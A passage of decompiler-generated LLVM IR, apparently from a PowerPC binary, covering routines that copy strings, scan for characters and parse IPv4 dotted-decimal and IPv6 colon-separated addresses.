  store i8 %v3_1000bb08, i8* %v4_1000bb18, align 1
  %v0_1000bb1c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000bb1c = add i32 %v0_1000bb1c, 1
  store i32 %v1_1000bb1c, i32* %r9.global-to-local, align 4
  %v1_1000bb20 = add i32 %v0_1000bb1c, 2
  store i32 %v1_1000bb20, i32* @r4, align 4
  %v0_1000bb24 = load i32, i32* @lr, align 4
  %v1_1000bb24 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000bb24, i32 %v0_1000bb24)
  %v0_1000bb28 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bb28 = add i32 %v0_1000bb28, 1
  %v2_1000bb28 = inttoptr i32 %v1_1000bb28 to i8*
  %v3_1000bb28 = load i8, i8* %v2_1000bb28, align 1
  %v0_1000bb2c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000bb2c = add i32 %v0_1000bb2c, 1
  store i32 %v1_1000bb2c, i32* %r11.global-to-local, align 4
  %v3_1000bb30 = icmp eq i8 %v3_1000bb28, 0
  store i1 %v3_1000bb30, i1* %cr7_eq.global-to-local, align 1
  %v2_1000bb34 = load i32, i32* %r7.global-to-local, align 4
  %v3_1000bb34 = add i32 %v2_1000bb34, 1
  %v4_1000bb34 = inttoptr i32 %v3_1000bb34 to i8*
  store i8 %v3_1000bb28, i8* %v4_1000bb34, align 1
  %v0_1000bb38 = load i32, i32* @lr, align 4
  %v1_1000bb38 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000bb38, i32 %v0_1000bb38)
  %v0_1000bb3c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000bb3c = add i32 %v0_1000bb3c, 1
  %v2_1000bb3c = inttoptr i32 %v1_1000bb3c to i8*
  %v3_1000bb3c = load i8, i8* %v2_1000bb3c, align 1
  %v4_1000bb3c = zext i8 %v3_1000bb3c to i32
  store i32 %v4_1000bb3c, i32* %r9.global-to-local, align 4
  %v3_1000bb40 = icmp eq i8 %v3_1000bb3c, 0
  store i1 %v3_1000bb40, i1* %cr7_eq.global-to-local, align 1
  %v2_1000bb44 = load i32, i32* %r10.global-to-local, align 4
  %v3_1000bb44 = add i32 %v2_1000bb44, 1
  %v4_1000bb44 = inttoptr i32 %v3_1000bb44 to i8*
  store i8 %v3_1000bb3c, i8* %v4_1000bb44, align 1
  %v0_1000bb48 = load i32, i32* @lr, align 4
  %v1_1000bb48 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000bb48, i32 %v0_1000bb48)
  %v0_1000bb4c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bb4c = add i32 %v0_1000bb4c, -1
  store i32 %v1_1000bb4c, i32* %ctr.global-to-local, align 4
  %v2_1000bb4c = icmp eq i32 %v1_1000bb4c, 0
  br i1 %v2_1000bb4c, label %dec_label_pc_1000bb50, label %dec_label_pc_1000baec.dec_label_pc_1000baec_crit_edge

dec_label_pc_1000baec.dec_label_pc_1000baec_crit_edge: ; preds = %dec_label_pc_1000baec
  %v0_1000baf0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000baec

dec_label_pc_1000bb50:                            ; preds = %dec_label_pc_1000baec
  %v0_1000bb50 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000bb50 = urem i32 %v0_1000bb50, 4
  store i32 %v1_1000bb50, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000bb74

dec_label_pc_1000bb58:                            ; preds = %dec_label_pc_1000bb74, %dec_label_pc_1000bb58.dec_label_pc_1000bb58_crit_edge
  %v0_1000bb5c = phi i32 [ %v0_1000bb5c.pre, %dec_label_pc_1000bb58.dec_label_pc_1000bb58_crit_edge ], [ %v0_1000bb74, %dec_label_pc_1000bb74 ]
  %v0_1000bb58 = load i32, i32* @r4, align 4
  %v1_1000bb58 = inttoptr i32 %v0_1000bb58 to i8*
  %v2_1000bb58 = load i8, i8* %v1_1000bb58, align 1
  %v3_1000bb58 = zext i8 %v2_1000bb58 to i32
  store i32 %v3_1000bb58, i32* %r9.global-to-local, align 4
  %v1_1000bb5c = add i32 %v0_1000bb5c, -1
  store i32 %v1_1000bb5c, i32* %r5.global-to-local, align 4
  %v1_1000bb60 = add i32 %v0_1000bb58, 1
  store i32 %v1_1000bb60, i32* @r4, align 4
  %v3_1000bb64 = icmp eq i8 %v2_1000bb58, 0
  store i1 %v3_1000bb64, i1* %cr7_eq.global-to-local, align 1
  %v2_1000bb68 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000bb68 = add i32 %v2_1000bb68, 1
  %v4_1000bb68 = inttoptr i32 %v3_1000bb68 to i8*
  store i8 %v2_1000bb58, i8* %v4_1000bb68, align 1
  store i32 %v3_1000bb68, i32* %r11.global-to-local, align 4
  %v0_1000bb6c = load i32, i32* @lr, align 4
  %v1_1000bb6c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000bb6c, i32 %v0_1000bb6c)
  %v0_1000bb7c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bb7c = add i32 %v0_1000bb7c, -1
  store i32 %v1_1000bb7c, i32* %ctr.global-to-local, align 4
  %v2_1000bb7c = icmp eq i32 %v1_1000bb7c, 0
  br i1 %v2_1000bb7c, label %dec_label_pc_1000bb80, label %dec_label_pc_1000bb58.dec_label_pc_1000bb58_crit_edge

dec_label_pc_1000bb58.dec_label_pc_1000bb58_crit_edge: ; preds = %dec_label_pc_1000bb58
  %v0_1000bb5c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000bb58

dec_label_pc_1000bb74:                            ; preds = %dec_label_pc_1000bad4, %dec_label_pc_1000bb50
  %v0_1000bb74 = phi i32 [ %arg2, %dec_label_pc_1000bad4 ], [ %v1_1000bb50, %dec_label_pc_1000bb50 ]
  store i32 %v0_1000bb74, i32* %ctr.global-to-local, align 4
  %v2_1000bb7c3 = icmp eq i32 %v0_1000bb74, 0
  br i1 %v2_1000bb7c3, label %dec_label_pc_1000bb80, label %dec_label_pc_1000bb58

dec_label_pc_1000bb80:                            ; preds = %dec_label_pc_1000bb58, %dec_label_pc_1000bb74
  %v0_1000bb80 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000bb80 = icmp eq i32 %v0_1000bb80, 0
  store i1 %v3_1000bb80, i1* %cr7_eq.global-to-local, align 1
  %v0_1000bb84 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000bb80, i32 %v0_1000bb84)
  %v0_1000bb88 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000bb88 = trunc i32 %v0_1000bb88 to i8
  %v2_1000bb88 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000bb88 = add i32 %v2_1000bb88, 1
  %v4_1000bb88 = inttoptr i32 %v3_1000bb88 to i8*
  store i8 %v1_1000bb88, i8* %v4_1000bb88, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_1000bb74, { 1, 2, 0 }
  uselistorder i32 %v1_1000bb7c, { 1, 0 }
  uselistorder i32 %v1_1000bb50, { 1, 0 }
  uselistorder i32 %v1_1000bb4c, { 1, 0 }
  uselistorder i32 %v2_1000bafc, { 1, 0 }
  uselistorder i32 %v1_1000bac8, { 1, 0 }
  uselistorder i32 %v0_1000bac4, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 6, 0, 7, 1, 2, 4, 3, 5, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_1000bb80, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb74, { 1, 0 }
}

define i32 @function_1000bb90(i8* %arg1) local_unnamed_addr {
dec_label_pc_1000bb90:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000bbc01 = load i32, i32* @r3, align 4
  %v1_1000bbc02 = inttoptr i32 %v0_1000bbc01 to i8*
  %v2_1000bbc03 = load i8, i8* %v1_1000bbc02, align 1
  %v3_1000bbc46 = icmp eq i8 %v2_1000bbc03, 0
  br i1 %v3_1000bbc46, label %dec_label_pc_1000bbd4, label %dec_label_pc_1000bbcc

dec_label_pc_1000bb9c:                            ; preds = %dec_label_pc_1000bb9c, %dec_label_pc_1000bbcc
  %v0_1000bb9c = phi i32 [ %v1_1000bba0, %dec_label_pc_1000bb9c ], [ %tmp, %dec_label_pc_1000bbcc ]
  %v1_1000bb9c = inttoptr i32 %v0_1000bb9c to i8*
  %v2_1000bb9c = load i8, i8* %v1_1000bb9c, align 1
  %v1_1000bba0 = add i32 %v0_1000bb9c, 1
  %v3_1000bba4 = icmp eq i8 %v2_1000bb9c, 0
  %v4_1000bba8 = icmp eq i8 %v0_1000bba88.in, %v2_1000bb9c
  %brmerge = or i1 %v3_1000bba4, %v4_1000bba8
  br i1 %brmerge, label %dec_label_pc_1000bbb0, label %dec_label_pc_1000bb9c

dec_label_pc_1000bbb0:                            ; preds = %dec_label_pc_1000bb9c
  br i1 %v3_1000bba4, label %dec_label_pc_1000bbd4, label %dec_label_pc_1000bbb8

dec_label_pc_1000bbb8:                            ; preds = %dec_label_pc_1000bbb0
  %v1_1000bbb8 = add i32 %v0_1000bbb8, 1
  %v1_1000bbbc = add i32 %v0_1000bbbc, 1
  %v1_1000bbc0 = inttoptr i32 %v1_1000bbbc to i8*
  %v2_1000bbc0 = load i8, i8* %v1_1000bbc0, align 1
  %v3_1000bbc4 = icmp eq i8 %v2_1000bbc0, 0
  br i1 %v3_1000bbc4, label %dec_label_pc_1000bbd4, label %dec_label_pc_1000bbcc

dec_label_pc_1000bbcc:                            ; preds = %dec_label_pc_1000bb90, %dec_label_pc_1000bbb8
  %v0_1000bbbc = phi i32 [ %v1_1000bbbc, %dec_label_pc_1000bbb8 ], [ %v0_1000bbc01, %dec_label_pc_1000bb90 ]
  %v0_1000bbb8 = phi i32 [ %v1_1000bbb8, %dec_label_pc_1000bbb8 ], [ 0, %dec_label_pc_1000bb90 ]
  %v0_1000bba88.in = phi i8 [ %v2_1000bbc0, %dec_label_pc_1000bbb8 ], [ %v2_1000bbc03, %dec_label_pc_1000bb90 ]
  br label %dec_label_pc_1000bb9c

dec_label_pc_1000bbd4:                            ; preds = %dec_label_pc_1000bbb8, %dec_label_pc_1000bbb0, %dec_label_pc_1000bb90
  %v0_1000bbd4 = phi i32 [ 0, %dec_label_pc_1000bb90 ], [ %v1_1000bbb8, %dec_label_pc_1000bbb8 ], [ %v0_1000bbb8, %dec_label_pc_1000bbb0 ]
  ret i32 %v0_1000bbd4

; uselistorder directives
  uselistorder i32 %v0_1000bb9c, { 1, 0 }
  uselistorder label %dec_label_pc_1000bbcc, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb9c, { 1, 0 }
}

define i32 @function_1000bbdc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000bbdc:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000bbdc = load i32, i32* @lr, align 4
  store i32 %v0_1000bbdc, i32* %r0.global-to-local, align 4
  %v0_1000bbe4 = call i32 @__asm_mfcr()
  store i32 %v0_1000bbe4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_1000bbf0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000bbf0, i32* %r7.global-to-local, align 4
  %v0_1000bbf4 = load i32, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000bc5c

dec_label_pc_1000bc0c:                            ; preds = %dec_label_pc_1000bc5c
  %v3_1000bc0c = icmp eq i32 %v0_1000bc80, 4
  store i1 %v3_1000bc0c, i1* %cr7_eq.global-to-local, align 1
  %v0_1000bc10 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_1000bc10, label %dec_label_pc_1000bc48, label %dec_label_pc_1000bc14

dec_label_pc_1000bc14:                            ; preds = %dec_label_pc_1000bc0c
  %v0_1000bc14 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000bc14 = inttoptr i32 %v0_1000bc14 to i8*
  %v2_1000bc14 = load i8, i8* %v1_1000bc14, align 1
  %v3_1000bc14 = zext i8 %v2_1000bc14 to i32
  %v1_1000bc18 = mul nuw nsw i32 %v3_1000bc14, 10
  %v1_1000bc1c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000bc1c = add i32 %v1_1000bc18, %v1_1000bc1c
  %v1_1000bc20 = add i32 %v2_1000bc1c, -48
  store i32 %v1_1000bc20, i32* %r0.global-to-local, align 4
  %v2_1000bc24 = icmp ugt i32 %v1_1000bc20, 255
  %v3_1000bc24 = icmp eq i32 %v1_1000bc20, 255
  store i1 %v3_1000bc24, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000bc24, label %dec_label_pc_1000bca4, label %dec_label_pc_1000bc2c

dec_label_pc_1000bc2c:                            ; preds = %dec_label_pc_1000bc14
  %v1_1000bc2c = trunc i32 %v1_1000bc20 to i8
  store i8 %v1_1000bc2c, i8* %v1_1000bc14, align 1
  %v0_1000bc30 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000bc30, label %dec_label_pc_1000bc34, label %dec_label_pc_1000bc5c.backedge

dec_label_pc_1000bc34:                            ; preds = %dec_label_pc_1000bc2c
  %v0_1000bc34 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000bc34 = add i32 %v0_1000bc34, 1
  store i32 %v1_1000bc34, i32* %r10.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v2_1000bc3c = icmp sgt i32 %v1_1000bc34, 4
  %v3_1000bc3c = icmp eq i32 %v1_1000bc34, 4
  store i1 %v3_1000bc3c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000bc3c, label %dec_label_pc_1000bca4, label %dec_label_pc_1000bc5c.backedge

dec_label_pc_1000bc48:                            ; preds = %dec_label_pc_1000bc0c
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_1000bc4c = load i1, i1* %cr1_eq.global-to-local, align 1
  %v0_1000bc4c.not = xor i1 %v0_1000bc4c, true
  %v0_1000bc50 = load i1, i1* %cr4_eq.global-to-local, align 1
  %brmerge = or i1 %v3_1000bc0c, %v0_1000bc50
  %or.cond = or i1 %brmerge, %v0_1000bc4c.not
  br i1 %or.cond, label %dec_label_pc_1000bca4, label %dec_label_pc_1000bc58

dec_label_pc_1000bc58:                            ; preds = %dec_label_pc_1000bc48
  %v0_1000bc58 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000bc58 = trunc i32 %v0_1000bc58 to i8
  %v2_1000bc58 = load i32, i32* %r7.global-to-local, align 4
  %v3_1000bc58 = add i32 %v2_1000bc58, 1
  %v4_1000bc58 = inttoptr i32 %v3_1000bc58 to i8*
  store i8 %v1_1000bc58, i8* %v4_1000bc58, align 1
  store i32 %v3_1000bc58, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000bc5c.backedge

dec_label_pc_1000bc5c.backedge:                   ; preds = %dec_label_pc_1000bc58, %dec_label_pc_1000bc2c, %dec_label_pc_1000bc34
  %v0_1000bc5c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1000bc60.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000bc5c

dec_label_pc_1000bc5c:                            ; preds = %dec_label_pc_1000bc5c.backedge, %dec_label_pc_1000bbdc
  %v0_1000bc60 = phi i32 [ %v0_1000bc60.pre, %dec_label_pc_1000bc5c.backedge ], [ 0, %dec_label_pc_1000bbdc ]
  %v0_1000bc64 = phi i32 [ %v0_1000bc5c.pre, %dec_label_pc_1000bc5c.backedge ], [ %v0_1000bbe4, %dec_label_pc_1000bbdc ]
  %v1_1000bc5c = inttoptr i32 %v0_1000bc64 to i8*
  %v2_1000bc5c = load i8, i8* %v1_1000bc5c, align 1
  %v3_1000bc5c = zext i8 %v2_1000bc5c to i32
  store i32 %v3_1000bc5c, i32* %r11.global-to-local, align 4
  %v3_1000bc60 = icmp eq i32 %v0_1000bc60, 0
  store i1 %v3_1000bc60, i1* %cr4_eq.global-to-local, align 1
  %v1_1000bc64 = add i32 %v0_1000bc64, 1
  store i32 %v1_1000bc64, i32* %r3.global-to-local, align 4
  %v3_1000bc68 = icmp eq i8 %v2_1000bc5c, 0
  store i1 %v3_1000bc68, i1* %cr7_eq.global-to-local, align 1
  %v1_1000bc6c = add nsw i32 %v3_1000bc5c, -48
  store i32 %v1_1000bc6c, i32* %r0.global-to-local, align 4
  %v2_1000bc70 = icmp ugt i32 %v1_1000bc6c, 9
  store i1 %v2_1000bc70, i1* %cr6_gt.global-to-local, align 1
  %v3_1000bc74 = icmp eq i8 %v2_1000bc5c, 46
  store i1 %v3_1000bc74, i1* %cr1_eq.global-to-local, align 1
  %v0_1000bc78 = load i4, i4* @cr4, align 1
  %v1_1000bc78 = call %2 @__asm_mcrf_cr0_write(i4 %v0_1000bc78)
  %v4_1000bc78 = extractvalue %2 %v1_1000bc78, 2
  store i1 %v4_1000bc78, i1* %cr0_eq.global-to-local, align 1
  %v0_1000bc7c = load i1, i1* %cr7_eq.global-to-local, align 1
  %v0_1000bc80 = load i32, i32* %r10.global-to-local, align 4
  br i1 %v0_1000bc7c, label %dec_label_pc_1000bc80, label %dec_label_pc_1000bc0c

dec_label_pc_1000bc80:                            ; preds = %dec_label_pc_1000bc5c
  %v3_1000bc80 = icmp eq i32 %v0_1000bc80, 3
  store i1 %v3_1000bc80, i1* %cr7_eq.global-to-local, align 1
  %tmp9 = icmp slt i32 %v0_1000bc80, 4
  br i1 %tmp9, label %dec_label_pc_1000bca4, label %dec_label_pc_1000bc88

dec_label_pc_1000bc88:                            ; preds = %dec_label_pc_1000bc80
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_1000bbf0, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000bc98.326 to i32), i32* @lr, align 4
  %v0_1000bc94 = call i32 @function_10006d8c()
  br label %dec_label_pc_1000bca4

dec_label_pc_1000bca4:                            ; preds = %dec_label_pc_1000bc48, %dec_label_pc_1000bc14, %dec_label_pc_1000bc34, %dec_label_pc_1000bc80, %dec_label_pc_1000bc88
  %storemerge = phi i32 [ 1, %dec_label_pc_1000bc88 ], [ 0, %dec_label_pc_1000bc80 ], [ 0, %dec_label_pc_1000bc34 ], [ 0, %dec_label_pc_1000bc14 ], [ 0, %dec_label_pc_1000bc48 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 %v0_1000bbf4, i32* %r0.global-to-local, align 4
  %v1_1000bcb4 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000bbe4)
  %v4_1000bcb4 = extractvalue %0 %v1_1000bcb4, 2
  store i1 %v4_1000bcb4, i1* %cr0_eq.global-to-local, align 1
  %v9_1000bcb4 = extractvalue %0 %v1_1000bcb4, 7
  store i4 %v9_1000bcb4, i4* @cr4, align 1
  %v0_1000bcb8 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000bcb8

; uselistorder directives
  uselistorder i32 %v1_1000bc34, { 1, 0, 2 }
  uselistorder i32 %v1_1000bc20, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000bbe4, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 3, 2 }
  uselistorder i32* %r11.global-to-local, { 1, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder i1* %cr6_gt.global-to-local, { 1, 0 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr1_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder i32 255, { 7, 8, 9, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000bca4, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1000bc5c.backedge, { 0, 2, 1 }
}

define i32 @function_1000bcbc(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000bcbc:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1000bcbc = icmp eq i32 %arg1, 2
  %v0_1000bcc0 = load i32, i32* @lr, align 4
  store i32 %v0_1000bcc0, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r22, align 4
  br i1 %v3_1000bcbc, label %dec_label_pc_1000bce8, label %dec_label_pc_1000bcdc

dec_label_pc_1000bcdc:                            ; preds = %dec_label_pc_1000bcbc
  %v3_1000bcdc = icmp eq i32 %arg1, 10
  br i1 %v3_1000bcdc, label %dec_label_pc_1000bcfc, label %dec_label_pc_1000be98

dec_label_pc_1000bce8:                            ; preds = %dec_label_pc_1000bcbc
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268483828, i32* @lr, align 4
  %v3_1000bcf0 = call i32 @function_1000bbdc(i32 %tmp, i32 %arg3)
  store i32 %v3_1000bcf0, i32* %r3.global-to-local, align 4
  store i32 %v3_1000bcf0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000beb0

dec_label_pc_1000bcfc:                            ; preds = %dec_label_pc_1000bcdc
  %v2_1000bcfc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000bcfc, i32* %r3.global-to-local, align 4
  store i32 268483852, i32* @lr, align 4
  %v3_1000bd08 = call i32 @function_10006e28(i32 %v2_1000bcfc, i32 0, i32 16)
  store i32 %v3_1000bd08, i32* %r3.global-to-local, align 4
  %v0_1000bd0c = load i32, i32* @r29, align 4
  %v1_1000bd0c = inttoptr i32 %v0_1000bd0c to i8*
  %v2_1000bd0c = load i8, i8* %v1_1000bd0c, align 1
  %v3_1000bd0c = zext i8 %v2_1000bd0c to i32
  store i32 %v3_1000bd0c, i32* %r0.global-to-local, align 4
  store i32 %v3_1000bd08, i32* @r31, align 4
  %v2_1000bd14 = add i32 %v3_1000bd08, 16
  store i32 %v2_1000bd14, i32* @r27, align 4
  %v3_1000bd18 = icmp eq i8 %v2_1000bd0c, 58
  br i1 %v3_1000bd18, label %dec_label_pc_1000bd20, label %dec_label_pc_1000bd2c

dec_label_pc_1000bd20:                            ; preds = %dec_label_pc_1000bcfc
  %v1_1000bd20 = add i32 %v0_1000bd0c, 1
  %v2_1000bd20 = inttoptr i32 %v1_1000bd20 to i8*
  %v3_1000bd20 = load i8, i8* %v2_1000bd20, align 1
  %v4_1000bd20 = zext i8 %v3_1000bd20 to i32
  store i32 %v4_1000bd20, i32* %r0.global-to-local, align 4
  store i32 %v1_1000bd20, i32* @r29, align 4
  %v3_1000bd24 = icmp eq i8 %v3_1000bd20, 58
  br i1 %v3_1000bd24, label %dec_label_pc_1000bd2c, label %dec_label_pc_1000beac

dec_label_pc_1000bd2c:                            ; preds = %dec_label_pc_1000bd20, %dec_label_pc_1000bcfc
  %v0_1000bd2c = phi i32 [ %v1_1000bd20, %dec_label_pc_1000bd20 ], [ %v0_1000bd0c, %dec_label_pc_1000bcfc ]
  store i32 %v0_1000bd2c, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1000be003036 = inttoptr i32 %v0_1000bd2c to i8*
  %v2_1000be003137 = load i8, i8* %v1_1000be003036, align 1
  %v3_1000be003238 = zext i8 %v2_1000be003137 to i32
  store i32 %v3_1000be003238, i32* %r3.global-to-local, align 4
  store i32 268484104, i32* @lr, align 4
  %v1_1000be043339 = call i32 @function_1000caac(i32 %v3_1000be003238)
  store i32 %v1_1000be043339, i32* %r3.global-to-local, align 4
  store i32 %v1_1000be043339, i32* @r30, align 4
  %v3_1000be083440 = icmp eq i32 %v1_1000be043339, 0
  br i1 %v3_1000be083440, label %dec_label_pc_1000be10, label %dec_label_pc_1000bd38.lr.ph

dec_label_pc_1000bd38:                            ; preds = %dec_label_pc_1000bd38.lr.ph, %dec_label_pc_1000be00.backedge
  %v1_1000be0435 = phi i32 [ %v1_1000be043341, %dec_label_pc_1000bd38.lr.ph ], [ %v1_1000be04, %dec_label_pc_1000be00.backedge ]
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1000f390.327 to i32), i32* @r25, align 4
  %v0_1000bd44 = load i32, i32* @r29, align 4
  %v1_1000bd44 = add i32 %v0_1000bd44, 1
  store i32 %v1_1000bd44, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1000f390.327 to i32), i32* @r3, align 4
  store i32 268483920, i32* @lr, align 4
  %v3_1000bd4c = call i32 @function_1000cacc(i32 ptrtoint ([17 x i8]* @global_var_1000f390.327 to i32), i32 %v1_1000be0435)
  store i32 %v3_1000bd4c, i32* %r3.global-to-local, align 4
  %v3_1000bd50 = icmp eq i32 %v3_1000bd4c, 0
  br i1 %v3_1000bd50, label %dec_label_pc_1000bd70, label %dec_label_pc_1000bd58

dec_label_pc_1000bd58:                            ; preds = %dec_label_pc_1000bd38
  %v0_1000bd58 = load i32, i32* @r25, align 4
  %v2_1000bd58 = sub i32 %v3_1000bd4c, %v0_1000bd58
  store i32 %v2_1000bd58, i32* %r0.global-to-local, align 4
  %v0_1000bd5c = load i32, i32* @r28, align 4
  %v1_1000bd5c = mul i32 %v0_1000bd5c, 16
  store i32 %v1_1000bd5c, i32* %r9.global-to-local, align 4
  %v2_1000bd60 = or i32 %v1_1000bd5c, %v2_1000bd58
  store i32 %v2_1000bd60, i32* @r28, align 4
  %tmp19 = icmp ult i32 %v2_1000bd60, 65536
  br i1 %tmp19, label %dec_label_pc_1000bdfc, label %dec_label_pc_1000beac

dec_label_pc_1000bd70:                            ; preds = %dec_label_pc_1000bd38
  %v0_1000bd70 = load i32, i32* @r30, align 4
  %v3_1000bd70 = icmp eq i32 %v0_1000bd70, 58
  br i1 %v3_1000bd70, label %dec_label_pc_1000bd78, label %dec_label_pc_1000bdcc

dec_label_pc_1000bd78:                            ; preds = %dec_label_pc_1000bd70
  %v0_1000bd78 = load i32, i32* @r23, align 4
  %v3_1000bd78 = icmp eq i32 %v0_1000bd78, 0
  br i1 %v3_1000bd78, label %dec_label_pc_1000bd80, label %dec_label_pc_1000bd94

dec_label_pc_1000bd80:                            ; preds = %dec_label_pc_1000bd78
  %v0_1000bd80 = load i32, i32* @r24, align 4
  %v3_1000bd80 = icmp eq i32 %v0_1000bd80, 0
  br i1 %v3_1000bd80, label %dec_label_pc_1000bd88, label %dec_label_pc_1000beac

dec_label_pc_1000bd88:                            ; preds = %dec_label_pc_1000bd80
  %v0_1000bd88 = load i32, i32* @r31, align 4
  store i32 %v0_1000bd88, i32* @r24, align 4
  %v0_1000bd8c = load i32, i32* @r29, align 4
  store i32 %v0_1000bd8c, i32* @r26, align 4
  br label %dec_label_pc_1000be00.backedge

dec_label_pc_1000bd94:                            ; preds = %dec_label_pc_1000bd78
  %v0_1000bd94 = load i32, i32* @r29, align 4
  %v1_1000bd94 = inttoptr i32 %v0_1000bd94 to i8*
  %v2_1000bd94 = load i8, i8* %v1_1000bd94, align 1
  %v3_1000bd94 = zext i8 %v2_1000bd94 to i32
  store i32 %v3_1000bd94, i32* %r0.global-to-local, align 4
  %v3_1000bd98 = icmp eq i8 %v2_1000bd94, 0
  br i1 %v3_1000bd98, label %dec_label_pc_1000beac, label %dec_label_pc_1000bda0

dec_label_pc_1000bda0:                            ; preds = %dec_label_pc_1000bd94
  %v0_1000bda0 = load i32, i32* @r31, align 4
  %v1_1000bda0 = add i32 %v0_1000bda0, 2
  store i32 %v1_1000bda0, i32* %r0.global-to-local, align 4
  %v1_1000bda4 = load i32, i32* @r27, align 4
  %v3_1000bda4 = icmp ugt i32 %v1_1000bda0, %v1_1000bda4
  br i1 %v3_1000bda4, label %dec_label_pc_1000beac, label %dec_label_pc_1000bdac

dec_label_pc_1000bdac:                            ; preds = %dec_label_pc_1000bda0
  %v0_1000bdac = load i32, i32* @r28, align 4
